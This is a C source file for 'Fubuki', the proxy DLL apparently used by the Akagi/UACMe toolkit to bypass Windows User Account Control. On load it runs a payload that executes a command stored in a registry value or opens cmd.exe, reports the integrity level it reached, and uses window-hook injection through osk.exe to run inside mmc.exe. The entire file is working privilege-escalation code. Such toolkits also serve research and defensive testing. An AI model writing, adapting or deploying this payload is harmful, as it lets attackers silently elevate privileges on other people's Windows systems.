/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.71
*
*  DATE:        07 May 2017
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"
#include "shared\_filename.h"
#include "unbcl.h"
#include "wbemcomn.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define T_AKAGI_KEY    L"Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"
#define T_AKAGI_FLAG   L"Flag"

//default execution flow
#define AKAGI_FLAG_KILO  0

//suppress all additional output
#define AKAGI_FLAG_TANGO 1

DWORD g_AkagiFlag;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* ucmShowProcessIntegrityLevel
*
* Purpose:
*
* Output current integrity level of target application.
*
*/
void ucmShowProcessIntegrityLevel(
    VOID
)
{
    NTSTATUS status;
    HANDLE hToken;

    ULONG LengthNeeded;

    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    DWORD dwIntegrityLevel;
    WCHAR *t = NULL;
    WCHAR szBuffer[MAX_PATH + 1];

    status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0, &LengthNeeded);
        if (status == STATUS_BUFFER_TOO_SMALL) {

            pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, LengthNeeded);
            if (pTIL) {
                status = NtQueryInformationToken(hToken, TokenIntegrityLevel, pTIL, LengthNeeded, &LengthNeeded);
                if (NT_SUCCESS(status)) {

                    dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
                        (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

                    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
                    {
                        t = L"Low Process";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
                    {
                        t = L"Medium Process";
                    }
                    else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID)
                    {
                        t = L"High Integrity Process";
                    }
                    else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID)
                    {
                        t = L"System Integrity Process";
                    }

                    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
                    wsprintf(szBuffer, L"PID=%lu, IntegrityLevel=%ws",
                        GetCurrentProcessId(), t);

                }
                LocalFree(pTIL);
            }
        }
        NtClose(hToken);
    }
    if (t) MessageBox(GetDesktopWindow(), szBuffer, GetCommandLineW(), MB_ICONINFORMATION);
}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
    VOID
)
{
    BOOL                    cond = FALSE, bResult = FALSE;
    HKEY                    hKey = NULL;
    LPWSTR                  lpParameter = NULL;
    LRESULT                 lRet;
    DWORD                   dwSize = 0, dwType, dwFlag = 0;
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    do {
        lRet = RegOpenKeyEx(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, KEY_READ, &hKey);
        if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
            break;
        }

        g_AkagiFlag = AKAGI_FLAG_KILO;

        dwType = REG_DWORD;
        dwSize = sizeof(DWORD);
        lRet = RegQueryValueEx(hKey, T_AKAGI_FLAG, NULL, &dwType, (LPBYTE)&dwFlag, &dwSize);
        if (lRet == ERROR_SUCCESS) {
            g_AkagiFlag = dwFlag;
        }

        dwSize = 0;
        lRet = RegQueryValueEx(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
        if (lRet != ERROR_SUCCESS) {
            break;
        }

        lpParameter = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
        if (lpParameter == NULL) {
            break;
        }

        lRet = RegQueryValueEx(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)lpParameter, &dwSize);
        if (lRet == ERROR_SUCCESS) {

            OutputDebugString(TEXT("Akagi letter found"));
            OutputDebugString(lpParameter);

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);

            startupInfo.dwFlags = STARTF_USESHOWWINDOW;
            startupInfo.wShowWindow = SW_SHOW;

            bResult = CreateProcess(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
                NULL, &startupInfo, &processInfo);

            if (bResult) {
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
            }

        }
        HeapFree(GetProcessHeap(), 0, lpParameter);

        RegCloseKey(hKey);
        hKey = NULL;
        RegDeleteKey(HKEY_CURRENT_USER, T_AKAGI_KEY);

    } while (cond);

    if (hKey != NULL) {
        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    DWORD                   cch;
    TCHAR                   cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    OutputDebugString(TEXT("Hello, Admiral"));

    if (!ucmQueryCustomParameter()) {

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
        startupInfo.cb = sizeof(startupInfo);

        RtlSecureZeroMemory(sysdir, sizeof(sysdir));
        cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
        if ((cch != 0) && (cch < MAX_PATH)) {
            RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
            _strcpy(cmdbuf, sysdir);
            _strcat(cmdbuf, TEXT("cmd.exe"));

            startupInfo.dwFlags = STARTF_USESHOWWINDOW;
            startupInfo.wShowWindow = SW_SHOW;

            if (CreateProcessAsUser(NULL, cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
                sysdir, &startupInfo, &processInfo))
            {
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);

                if (g_AkagiFlag == AKAGI_FLAG_KILO) {
                    ucmShowProcessIntegrityLevel();
                }
            }
        }

    }
    ExitProcess(0);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    WCHAR szModuleName[MAX_PATH + 1];

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;

    //
    // Check if we are in the required application context
    // Are we inside osk.exe?
    //
    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
        if (HookProcedure) {
            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
            if (hHook) {
                //
                // Timeout to be enough to spawn target app.
                //
                Sleep(15000);
                UnhookWindowsHookEx(hHook);
            }
        }
        ExitProcess(0);
    }

    //
    // Are we inside target app?
    //
    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
        DefaultPayload();
    }
}

/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH)
        UiAccessMethodPayload(hinstDLL);

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH)
        DefaultPayload();

    return TRUE;
}
